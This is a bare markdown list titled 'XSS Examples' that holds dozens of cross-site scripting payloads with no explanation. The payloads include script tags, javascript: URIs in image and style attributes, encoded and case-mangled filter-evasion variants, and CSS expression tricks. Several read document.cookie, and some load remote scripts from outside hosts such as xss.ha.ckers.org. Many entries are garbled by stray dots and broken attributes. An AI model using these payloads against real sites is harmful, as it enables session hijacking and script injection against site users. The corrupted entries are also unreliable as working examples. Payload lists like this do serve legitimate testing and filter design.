# XSS Examples

```html
<svg onload="alert`xss！！！`"></svg>
"&gt; <svg onload="alert`xss！！！`"></svg>
16:47
<div class="body"><script>alert('hello，gaga!');</script> //经典语句，哈哈！

&gt;"'&gt;<img src="javascript.:alert('XSS')">

&gt;"'&gt;<script>alert('XSS')</script>

<table background="javascript.:alert(([code])"></table>

<p><object type="text/html" data="javascript.:alert(([code]);"></object></p>

<p>"+alert('XSS')+"</p>

<p>'&gt;<script>alert(document.cookie)</script></p>

<p>='&gt;<script>alert(document.cookie)</script></p>

<script>alert(document.cookie)</script>

<script>alert(vulnerable)</script>

<p><s&#99;ript>alert('XSS')</s&#99;ript></p>

<p><img src="javascript:alert('XSS')"></p>

<p>%0a%0a<script>alert(\&quot;Vulnerable\&quot;)</script>.jsp</p>

<p>%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</p>

<p>%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</p>

<p>%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</p>

<script>alert('Vulnerable')</script>

<p>a.jsp/<script>alert(&#39;Vulnerable&#39;)</script></p>

<p>"&gt;<script>alert(&#39;Vulnerable&#39;)</script></p>

<p><img src="javascript.:alert('XSS');"></p>

<p><img src="/javascript.:alert" ('xss')=""></p>

<p><img src="/JaVaScRiPt.:alert" ('xss')=""></p>

<p><img src="/JaVaScRiPt.:alert" (&quot;xss&quot;)=""></p>

<p><img src="jav&#9;ascript.:alert('XSS');"></p>

<p><img src="jav&#10;ascript.:alert('XSS');"></p>

<p><img src="jav&#13;ascript.:alert('XSS');"></p>

<p>"<img src="/java" \0script.:alert(\"xss\")="">";'&gt;out</p>

<p><img src=" javascript.:alert('XSS');"></p>

<script>a=/XSS/alert(a.source)</script>

<p><img dynsrc="javascript.:alert('XSS')"></p>

<p><img lowsrc="javascript.:alert('XSS')"></p>

<p><bgsound src="javascript.:alert('XSS');"></p>

<p><br size="&amp;{alert('XSS')}"></p>

<p><layer src="http://xss.ha.ckers.org/a.js"></layer></p>

<p><link rel="stylesheet" href="javascript.:alert('XSS');"></p>

<p><img src="vbscript.:msgbox(&quot;XSS&quot;)"></p>

<p><meta. http-equiv="refresh" content="0;url=javascript.:alert('XSS');"></meta.></p>

<p><iframe. src="/javascript.:alert" ('xss')=""></iframe.></p>

<p><frame. src="/javascript.:alert" ('xss')=""></frame.></p>

<p></p><p></p><p></p><div style="background-image: url(javascript.:alert('XSS'))"><p></p>

<p></p><div style="behaviour: url('http://www.how-to-hack.org/exploit.html');"><p></p>

<p></p><div style="width: expression(alert('XSS'));"><p></p>

<style>@im\port'\ja\vasc\ript:alert("XSS")';</style>

<p><img style="xss:expre\ssion(alert(&quot;XSS&quot;))"></p>

<p><style. type="text/javascript">alert('XSS');</style.></p>

<p><style. type="text/css">.XSS{background-image:url("javascript.:alert('XSS')");}<a class="XSS"></a></style.></p>

<p><style. type="text/css">BODY{background:url("javascript.:alert('XSS')")}</style.></p>

<p><base href="javascript.:alert('XSS');//"></p>

<p>getURL("javascript.:alert('XSS')")</p>

<p>a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);</p>

<p><xml src="javascript.:alert('XSS');"></xml></p>

<p>"&gt; <script>function a(){alert(&#39;XSS&#39;);}</script>&lt;"</p>

<p><script. src="http://xss.ha.ckers.org/xss.jpg"></script.></p>

<p>&lt;IMG SRC="javascript.:alert('XSS')"</p>

<p><script. a=">&quot;SRC=&quot;<a href=" http:="" xss.ha.ckers.org="" a.js%22%3e"="">http://xss.ha.ckers.org/a.js"&gt;</script.></p>

<p><script.=">"SRC="<a href="http://xss.ha.ckers.org/a.js%22%3E">http://xss.ha.ckers.org/a.js"&gt;</a></script.="></p>

<p><script. a=">&quot;''SRC=&quot;<a href=" http:="" xss.ha.ckers.org="" a.js%22%3e"="">http://xss.ha.ckers.org/a.js"&gt;</script.></p>

<p><script."a='>'"SRC="<a href="http://xss.ha.ckers.org/a.js%22%3E">http://xss.ha.ckers.org/a.js"&gt;</a></script."a='></p>

<script>document.write("<SCRI");</script><scriptsrc="http: xss.ha.ckers.org="" a.js"="">

<table background="javascript.:alert('XSS')"></table></div>
```

